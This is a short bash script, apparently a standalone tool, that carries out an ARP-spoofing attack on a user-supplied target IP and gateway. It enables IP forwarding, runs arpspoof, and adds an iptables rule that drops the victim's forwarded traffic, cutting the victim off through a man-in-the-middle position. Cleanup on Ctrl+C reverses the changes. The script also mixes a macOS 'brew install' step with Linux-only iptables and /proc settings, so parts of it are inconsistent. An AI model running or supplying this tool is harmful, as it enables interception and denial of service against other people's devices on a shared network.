#!/bin/bash

# Function to stop ARP spoofing and clean up
stop_spoofing() {
    echo "Stopping ARP spoofing and cleaning up..."
    
    # Kill the ARP spoofing process
    sudo kill $spoof_pid
    
    # Remove the iptables rule
    sudo iptables -D FORWARD -s $target_ip -o $interface -j DROP
    
    # Disable IP forwarding
    sudo sh -c 'echo 0 > /proc/sys/net/ipv4/ip_forward'
    
    echo "ARP spoofing stopped and iptables rule removed."
    exit 0
}

# Prompt for sudo password at the start
sudo -v

# Enable IP forwarding
sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'

# Start ARP spoofing
echo "Please enter your network interface (e.g., eth0, wlan0):"
read interface
echo "Please enter the target IP:"
read target_ip
echo "Please enter the gateway IP:"
read gateway_ip
brew install xterm

sudo arpspoof -i $interface -t $target_ip $gateway_ip &
spoof_pid=$!  # Store the process ID of arpspoof

# Start a new terminal window for iptables command using xterm
echo "Starting iptables to drop packets from the target IP..."
xterm -e "sudo iptables -A FORWARD -s $target_ip -o $interface -j DROP; bash"

echo "ARP spoofing and iptables setup complete."
echo "Press Ctrl+C to stop ARP spoofing."

# Wait for the user to press Ctrl+C
trap stop_spoofing SIGINT

# Keep the script running
while true; do
    sleep 1
done
